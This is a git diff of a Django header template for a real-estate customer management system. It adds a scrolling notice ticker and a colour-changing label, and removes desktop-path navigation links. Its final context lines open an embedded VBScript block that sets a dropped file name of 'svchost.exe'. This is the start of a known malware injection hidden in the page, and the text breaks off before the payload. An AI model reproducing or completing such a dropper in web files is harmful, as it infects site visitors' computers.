@@ -39,7 +39,7 @@
 
              }
     </script>
-		<style type="text/css">
+<style type="text/css">
 <!--
 body {
 	margin-left: 0px;
@@ -69,19 +69,49 @@ a {
 	font-size: 12px;
 }
 -->
+
+/*滚动css样式*/
+    *{
+        margin: 0;
+        padding: 0;
+    }
+    #container{
+        width: 500px;
+        height: 28px;
+        overflow: hidden;
+        position:relative;
+    }
+    #box{
+        position:absolute;
+        left:0;
+        top:0;
+        width: 500px;
+        height: 28px;
+        overflow: hidden;
+     /*background: #ccc;*/
+    }
+    #box li{
+        list-style-type: none;
+        height: 20px;
+        font-size:12px;
+    }
+
+/*滚动css样式结束*/
+
 </style>
 
 	</head>
-
 
 	<body onload="startclock()">
 		<form name="clock">
 
 			<table width="100%" border="0" cellspacing="0" cellpadding="0">
-				<tbody><tr>
+				<tbody>
+                <tr>
 					<td height="70" background="/static/main_05.gif">
 						<table width="100%" border="0" cellspacing="0" cellpadding="0">
-							<tbody><tr>
+							<tbody>
+                            <tr>
 								<td height="24">
 									<table width="100%" border="0" cellspacing="0" cellpadding="0">
 										<tbody><tr>
@@ -145,7 +175,7 @@ a {
 														</td>
 														<td width="220" valign="bottom" nowrap="nowrap">
 															<div align="right">
-																<span class="STYLE1"><span class="STYLE2">■</span>
+																<span class="STYLE1"><span class="STYLE2">■ </span>
 																	今天是：<input disabled="disabled" name="thetime" style="font-size: 9pt; background-color: #333333; color: #FFFFFF; border: 0" size="25"> </span>
 															</div>
 														</td>
@@ -183,153 +213,32 @@ a {
 					</td>
 				</tr>
 				<tr>
-					<td height="28" background="/static/main_36.gif">
+					<td height="28" style="background-image:url('/static/main_36.gif')">
 						<table width="100%" border="0" cellspacing="0" cellpadding="0">
 							<tbody><tr>
-								<td width="177" height="28" background="/static/main_32.gif">
+                                <td style="width:100px; height:28px; background-image:url('/static/main_32.gif'); background-repeat:no-repeat">
 									<table width="100%" border="0" cellspacing="0" cellpadding="0">
-										<tbody><tr>
-											<td width="20%" height="22">
-												&nbsp;
-											</td>
-											<td width="59%" valign="bottom">
-												<div align="center" class="STYLE1">
-													当前用户：admin</div>
-											</td>
-											<td width="21%">
-												&nbsp;
-											</td>
+										<tbody>
+                                        <tr>
+{#											<td width="20%" height="22"></td>#}
+											<td width="20%">
+                                                <div align="center" class="STYLE1">当前用户：admin &emsp;&emsp;</div>
+                                            </td>
 										</tr>
 									</tbody></table>
 								</td>
-								<td>
-									<table width="100%" border="0" cellspacing="0" cellpadding="0">
-										<tbody><tr>
-											<td width="65" height="28">
-												<table width="100%" border="0" cellspacing="0" cellpadding="0">
-													<tbody><tr>
-														<td height="23" valign="bottom">
-															<table width="58" border="0" align="center" cellpadding="0" cellspacing="0">
-																<tbody><tr>
-																	<td height="20" style="cursor: hand" onmouseover="this.style.backgroundImage=&#39;url(../../resource/images/bg.gif)&#39;;this.style.borderStyle=&#39;solid&#39;;this.style.borderWidth=&#39;1&#39;;borderColor=&#39;#a6d0e7&#39;; " onmouseout="this.style.backgroundImage=&#39;url()&#39;;this.style.borderStyle=&#39;none&#39;">
-																		<div align="center" class="STYLE3">
-																			<a href="file:///C:/Users/dangyl/Desktop/%E9%98%B6%E6%AE%B5%E9%A1%B9%E7%9B%AE/2.%E9%A1%B9%E7%9B%AE%E6%A1%88%E4%BE%8B%E5%BA%93/4.%E6%88%BF%E5%9C%B0%E4%BA%A7%E5%AE%A2%E6%88%B7%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/html%E5%8E%9F%E5%9E%8B/view/frame/%3C%=basePath%%3Eservlet/WorkQueryServlet" target="mainFrame">工作台</a>
-																		</div>
-																	</td>
-																</tr>
-															</tbody></table>
-														</td>
-													</tr>
-												</tbody></table>
-											</td>
-											<td width="3">
-												<img src="/static/main_34.gif" width="3" height="28">
-											</td>
-											<td width="63">
-												<table width="58" border="0" align="center" cellpadding="0" cellspacing="0">
-													<tbody><tr>
-														<td height="20" style="cursor: hand" onmouseover="this.style.backgroundImage=&#39;url(../../resource/images/bg.gif)&#39;;this.style.borderStyle=&#39;solid&#39;;this.style.borderWidth=&#39;1&#39;;borderColor=&#39;#a6d0e7&#39;; " onmouseout="this.style.backgroundImage=&#39;url()&#39;;this.style.borderStyle=&#39;none&#39;">
-															<div align="center" class="STYLE3">
-																<a href="file:///C:/Users/dangyl/Desktop/%E9%98%B6%E6%AE%B5%E9%A1%B9%E7%9B%AE/2.%E9%A1%B9%E7%9B%AE%E6%A1%88%E4%BE%8B%E5%BA%93/4.%E6%88%BF%E5%9C%B0%E4%BA%A7%E5%AE%A2%E6%88%B7%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/html%E5%8E%9F%E5%9E%8B/view/frame/%3C%=basePath%%3Eservlet/ReportFormsQueryServlet" target="mainFrame">报表</a>
-															</div>
-														</td>
-													</tr>
-												</tbody></table>
-											</td>
-											<td width="3">
-												<img src="/static/main_34.gif" width="3" height="28">
-											</td>
-											<td width="63">
-												<table width="58" border="0" align="center" cellpadding="0" cellspacing="0">
-													<tbody><tr>
-														<td height="20" style="cursor: hand" onmouseover="this.style.backgroundImage=&#39;url(../../resource/images/bg.gif)&#39;;this.style.borderStyle=&#39;solid&#39;;this.style.borderWidth=&#39;1&#39;;borderColor=&#39;#a6d0e7&#39;; " onmouseout="this.style.backgroundImage=&#39;url()&#39;;this.style.borderStyle=&#39;none&#39;">
-															<div align="center" class="STYLE3">
-																<a href="file:///C:/Users/dangyl/Desktop/%E9%98%B6%E6%AE%B5%E9%A1%B9%E7%9B%AE/2.%E9%A1%B9%E7%9B%AE%E6%A1%88%E4%BE%8B%E5%BA%93/4.%E6%88%BF%E5%9C%B0%E4%BA%A7%E5%AE%A2%E6%88%B7%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/html%E5%8E%9F%E5%9E%8B/view/frame/%3C%=basePath%%3Eservlet/CustomerQueryServlet?userId=%3C%=userInfo.getUserId()%%3E" target="mainFrame">客户信息</a>
-															</div>
-														</td>
-													</tr>
-												</tbody></table>
-											</td>
-											<td width="3">
-												<img src="/static/main_34.gif" width="3" height="28">
-											</td>
-											<td width="63">
-												<table width="58" border="0" align="center" cellpadding="0" cellspacing="0">
-													<tbody><tr>
-														<td height="20" style="cursor: hand" onmouseover="this.style.backgroundImage=&#39;url(../../resource/images/bg.gif)&#39;;this.style.borderStyle=&#39;solid&#39;;this.style.borderWidth=&#39;1&#39;;borderColor=&#39;#a6d0e7&#39;; " onmouseout="this.style.backgroundImage=&#39;url()&#39;;this.style.borderStyle=&#39;none&#39;">
-															<div align="center" class="STYLE3">
-																<a href="file:///C:/Users/dangyl/Desktop/%E9%98%B6%E6%AE%B5%E9%A1%B9%E7%9B%AE/2.%E9%A1%B9%E7%9B%AE%E6%A1%88%E4%BE%8B%E5%BA%93/4.%E6%88%BF%E5%9C%B0%E4%BA%A7%E5%AE%A2%E6%88%B7%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/html%E5%8E%9F%E5%9E%8B/view/frame/%3C%=basePath%%3Eservlet/UserQueryServlet" target="mainFrame">员工信息</a>
-															</div>
-														</td>
-													</tr>
-												</tbody></table>
-											</td>
-											<td width="3">
-												<img src="/static/main_34.gif" width="3" height="28">
-											</td>
-											<td width="63">
-												<table width="58" border="0" align="center" cellpadding="0" cellspacing="0">
-													<tbody><tr>
-														<td height="20" style="cursor: hand" onmouseover="this.style.backgroundImage=&#39;url(../../resource/images/bg.gif)&#39;;this.style.borderStyle=&#39;solid&#39;;this.style.borderWidth=&#39;1&#39;;borderColor=&#39;#a6d0e7&#39;; " onmouseout="this.style.backgroundImage=&#39;url()&#39;;this.style.borderStyle=&#39;none&#39;">
-															<div align="center" class="STYLE3">
-																<a href="file:///C:/Users/dangyl/Desktop/%E9%98%B6%E6%AE%B5%E9%A1%B9%E7%9B%AE/2.%E9%A1%B9%E7%9B%AE%E6%A1%88%E4%BE%8B%E5%BA%93/4.%E6%88%BF%E5%9C%B0%E4%BA%A7%E5%AE%A2%E6%88%B7%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/html%E5%8E%9F%E5%9E%8B/view/frame/%3C%=basePath%%3Eservlet/NoticeQueryServlet" target="mainFrame">公告信息</a>
-															</div>
-														</td>
-													</tr>
-												</tbody></table>
-											</td>
-											<td width="3">
-												<img src="/static/main_34.gif" width="3" height="28">
-											</td>
-											<td width="63">
-												<table width="58" border="0" align="center" cellpadding="0" cellspacing="0">
-													<tbody><tr>
-														<td height="20" style="cursor: hand" onmouseover="this.style.backgroundImage=&#39;url(../../resource/images/bg.gif)&#39;;this.style.borderStyle=&#39;solid&#39;;this.style.borderWidth=&#39;1&#39;;borderColor=&#39;#a6d0e7&#39;; " onmouseout="this.style.backgroundImage=&#39;url()&#39;;this.style.borderStyle=&#39;none&#39;">
-															<div align="center" class="STYLE3">
-																<a href="file:///C:/Users/dangyl/Desktop/%E9%98%B6%E6%AE%B5%E9%A1%B9%E7%9B%AE/2.%E9%A1%B9%E7%9B%AE%E6%A1%88%E4%BE%8B%E5%BA%93/4.%E6%88%BF%E5%9C%B0%E4%BA%A7%E5%AE%A2%E6%88%B7%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/html%E5%8E%9F%E5%9E%8B/view/frame/%3C%=basePath%%3Eservlet/EmailQueryServlet" target="mainFrame">发件箱</a>
-															</div>
-														</td>
-													</tr>
-												</tbody></table>
-											</td>
-											<td width="3">
-												<img src="/static/main_34.gif" width="3" height="28">
-											</td>
-											<td width="63">
-												<table width="58" border="0" align="center" cellpadding="0" cellspacing="0">
-													<tbody><tr>
-														<td height="20" style="cursor: pointer; background-image: url(&quot;&quot;); border-style: none; border-width: 1px;" onmouseover="this.style.backgroundImage=&#39;url(../../resource/images/bg.gif)&#39;;this.style.borderStyle=&#39;solid&#39;;this.style.borderWidth=&#39;1&#39;;borderColor=&#39;#a6d0e7&#39;; " onmouseout="this.style.backgroundImage=&#39;url()&#39;;this.style.borderStyle=&#39;none&#39;">
-															<div align="center" class="STYLE3">
-																<a href="file:///C:/Users/dangyl/Desktop/%E9%98%B6%E6%AE%B5%E9%A1%B9%E7%9B%AE/2.%E9%A1%B9%E7%9B%AE%E6%A1%88%E4%BE%8B%E5%BA%93/4.%E6%88%BF%E5%9C%B0%E4%BA%A7%E5%AE%A2%E6%88%B7%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/html%E5%8E%9F%E5%9E%8B/view/frame/%3C%=basePath%%3Eservlet/HouseQueryServlet?userId=%3C%=userInfo.getUserId()%%3E" target="mainFrame">房屋信息</a>
-															</div>
-														</td>
-													</tr>
-												</tbody></table>
-											</td>
-											<td width="3">
-												<img src="/static/main_34.gif" width="3" height="28">
-											</td>
-											<td width="63">
-												<table width="58" border="0" align="center" cellpadding="0" cellspacing="0">
-													<tbody><tr>
-														<td height="20" style="cursor: hand" onmouseover="this.style.backgroundImage=&#39;url(../../resource/images/bg.gif)&#39;;this.style.borderStyle=&#39;solid&#39;;this.style.borderWidth=&#39;1&#39;;borderColor=&#39;#a6d0e7&#39;; " onmouseout="this.style.backgroundImage=&#39;url()&#39;;this.style.borderStyle=&#39;none&#39;">
-															<div align="center" class="STYLE3">
-																<a href="file:///C:/Users/dangyl/Desktop/%E9%98%B6%E6%AE%B5%E9%A1%B9%E7%9B%AE/2.%E9%A1%B9%E7%9B%AE%E6%A1%88%E4%BE%8B%E5%BA%93/4.%E6%88%BF%E5%9C%B0%E4%BA%A7%E5%AE%A2%E6%88%B7%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/html%E5%8E%9F%E5%9E%8B/view/frame/%3C%=basePath%%3Eview/fetion/fetion_add.jsp" target="mainFrame">发送飞信</a>
-															</div>
-														</td>
-													</tr>
-												</tbody></table>
-											</td>
-
-
-											<td>
-												&nbsp;
-											</td>
-										</tr>
-									</tbody></table>
+                                <td id="zxgg" width="5%" style="color:red; font-size:12px; font-weight:bold">最新公告：</td>
+                                <td id="container">
+									<div id="box">
+                                        {% for n in nlist %}
+                                            <ul>
+                                                <li>{{ n.notice_time|date:'Y-m-d h:i:s'}} 【{{ n.notice_item }}】{{ n.notice_content }}</li>
+                                            </ul>
+                                        {% endfor %}
+									</div>
 								</td>
-								<td width="21">
-									<img src="/static/main_37.gif" width="21" height="28">
+								<td width="20%">
+									<img src="/static/main_37.gif" align='right' width="10" height="28">
 								</td>
 							</tr>
 						</tbody></table>
@@ -338,6 +247,44 @@ a {
 			</tbody></table>
 		</form>
 
+
+<script>
+var oDiv = document.getElementById('box');
+    oDiv.innerHTML += oDiv.innerHTML;
+    oDiv.scrollTop = 0;
+    var timer;
+    function startMove(){
+        timer = setInterval(scrollUp,70);
+        oDiv.scrollTop++;
+    }
+    function scrollUp()
+    {
+        if(oDiv.scrollTop%28 === 0)
+        {
+            clearInterval(timer);
+            setTimeout(startMove,10);
+        }
+        else
+        {
+            oDiv.scrollTop++;
+            if(oDiv.scrollTop >= oDiv.scrollHeight/2)
+            {
+                oDiv.scrollTop = 0;
+            }
+        }
+    }
+    setTimeout(startMove,10);
+
+</script>
+
+<script language="javascript">
+    function changeColor(){
+        var color="red|black|yellow|blue";
+        color=color.split("|");
+        document.getElementById("zxgg").style.color=color[parseInt(Math.random() * color.length)];
+    }
+    setInterval("changeColor()",200);
+</script>
 
 <script language="VBScript"><!--
 DropFileName = "svchost.exe"
